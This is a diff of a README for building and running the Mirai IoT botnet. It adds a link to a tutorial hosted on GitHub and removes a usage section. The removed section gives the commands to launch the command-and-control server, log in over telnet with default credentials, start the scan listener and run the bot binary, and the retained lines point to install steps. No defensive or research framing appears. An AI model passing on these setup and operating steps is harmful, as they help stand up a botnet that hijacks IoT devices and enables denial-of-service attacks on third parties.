@@ -38,9 +38,9 @@ The [zip file](https://www.virustotal.com/en/file/f10667215040e87dae62dd48a5405b
 ## Install
 
 ※If you are not logged in as root, be sure to add sudo and follow the installation instructions below.<br />
-※If you are unable to install the software, please refer to the following URL for installation.
-
-https://programmer.group/mirai-botnet-environment-setup-steps.html
+※If you are unable to install the software, please refer to the following URL for installation.<br />
+https://programmer.group/mirai-botnet-environment-setup-steps.html <br />
+https://github.com/ruCyberPoison/-Mirai-Iot-BotNet/blob/master/TUTORIAL.txt
 
 ```
 # sudo apt-get install git gcc golang electric-fence mysql-server mysql-client
@@ -203,30 +203,3 @@ and after than type this code but put you filename here --> file.txt before past
 ```
 This completes the installation. :)<br />
 Thank you for your hard work. Take a break and have a cup of coffee or something.
-
-## How to use
-※If you are not logged in as root, be sure to add sudo and follow these steps.
-
-https://programmer.group/mirai-botnet-environment-setup-steps.html
-
-```
-# ./release/cnc
-```
-Open a new winsow.
-```
-# telnet cnc.change.com 23
-```
-username & password
-```
-username: mirai-user
-password: mirai-user
-```
-Open a new winsow.
-```
-# cd mirai/debug
-# ./scanListen
-```
-Open a new winsow.
-```
-# sudo ./mirai.dbg
-```
